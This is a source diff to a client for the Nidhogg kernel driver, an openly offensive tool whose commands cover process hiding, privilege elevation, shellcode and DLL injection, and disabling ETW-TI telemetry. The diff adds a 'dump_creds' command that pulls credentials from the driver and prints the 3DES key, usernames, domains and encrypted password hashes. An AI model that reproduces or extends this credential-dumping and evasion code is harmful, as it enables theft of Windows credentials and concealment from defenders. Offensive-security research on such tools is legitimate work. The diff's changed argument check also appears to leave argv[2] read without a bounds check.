@@ -6,7 +6,7 @@
 
 enum class Options {
 	Unknown,
-	Add, Remove, Clear, Hide, Unhide, Elevate, Signature, Query, Write, Read, Patch, InjectShellcode, InjectDll
+	Add, Remove, Clear, Hide, Unhide, Elevate, Signature, Query, Write, Read, Patch, InjectShellcode, InjectDll, DumpCredentials
 };
 
 #define PRINT_ASCII_ART
@@ -53,6 +53,7 @@ void PrintUsage() {
 	std::cout << "\tNidhoggClient.exe dllinject [apc | thread] [pid] [dll path]" << std::endl;
 	std::cout << "\tNidhoggClient.exe callbacks [query | remove | restore] [callback type] [callback address]" << std::endl;
 	std::cout << "\tNidhoggClient.exe etwti [enable | disable]" << std::endl;
+	std::cout << "\tNidhoggClient.exe dump_creds" << std::endl;
 }
 
 std::vector<byte> ConvertToVector(std::wstring rawPatch) {
@@ -100,14 +101,16 @@ int wmain(int argc, const wchar_t* argv[]) {
 	if (!nidhoggInterface.IsValid())
 		return NIDHOGG_ERROR_CONNECT_DRIVER;
 
-	if (argc < 3) {
+	if (argc < 2) {
 		PrintUsage();
 		nidhoggInterface.PrintError(NIDHOGG_INVALID_INPUT);
 		nidhoggInterface.~NidhoggInterface();
 		return NIDHOGG_INVALID_INPUT;
 	}
 
-	if (_wcsicmp(argv[2], L"add") == 0 || _wcsicmp(argv[2], L"restore") == 0 || _wcsicmp(argv[2], L"enable") == 0)
+	if (_wcsicmp(argv[1], L"dump_creds") == 0)
+		option = Options::DumpCredentials;
+	else if (_wcsicmp(argv[2], L"add") == 0 || _wcsicmp(argv[2], L"restore") == 0 || _wcsicmp(argv[2], L"enable") == 0)
 		option = Options::Add;
 	else if (_wcsicmp(argv[2], L"remove") == 0 || _wcsicmp(argv[2], L"disable") == 0)
 		option = Options::Remove;
@@ -141,7 +144,11 @@ int wmain(int argc, const wchar_t* argv[]) {
 	}
 
 	std::cout << "[ + ] Connected to driver" << std::endl;
-	std::wcout << L"[ + ] Attempting to " << argv[2] << L" a " << argv[1] << std::endl;
+
+	if (argv[2])
+		std::wcout << L"[ + ] Attempting to " << argv[2] << L" a " << argv[1] << std::endl;
+	else
+		std::wcout << L"[ + ] Attempting to " << argv[1] << std::endl;
 
 	switch (option) {
 	case Options::Add:
@@ -738,8 +745,39 @@ int wmain(int argc, const wchar_t* argv[]) {
 		success = nidhoggInterface.InjectDll(pid, dllPath.c_str(), injectionType);
 		break;
 	}
-	}
+	case Options::DumpCredentials:
+	{
+		DesKeyInformation desKey{};
+		std::wstring currentUsername;
+		std::wstring currentDomain;
+		std::vector<Credentials> creds = nidhoggInterface.DumpCredentials(&desKey, &success);
 
+		if (success == NIDHOGG_SUCCESS) {
+			std::cout << "3DES Key (size: 0x" << std::hex << desKey.Size << "): ";
+			for (DWORD i = 0; i < desKey.Size; i++)
+				std::cout << (int)(((PUCHAR)desKey.Data)[i]);
+			std::cout << "\nCredentials:" << std::endl;
+
+			for (DWORD i = 0; i < creds.size(); i++) {
+				currentUsername = std::wstring(creds[i].Username.Buffer, creds[i].Username.Length / sizeof(WCHAR));
+				currentDomain = std::wstring(creds[i].Domain.Buffer, creds[i].Domain.Length / sizeof(WCHAR));
+				std::wcout << L"\nUsername: " << currentUsername << std::endl;
+				std::wcout << L"Domain: " << currentDomain << std::endl;
+				std::cout << "Encrypted Hash: ";
+
+				for (DWORD j = 0; j < creds[i].EncryptedHash.Length; j++)
+					std::cout << (int)(((PUCHAR)creds[i].EncryptedHash.Buffer)[j]);
+				std::cout << std::endl;
+
+				free(creds[i].Username.Buffer);
+				free(creds[i].Domain.Buffer);
+				free(creds[i].EncryptedHash.Buffer);
+			}
+			std::cout << std::endl;
+		}
+		break;
+	}
+	}
 
 	if (success == NIDHOGG_SUCCESS)
 		std::cout << "[ + ] Operation succeeded." << std::endl;
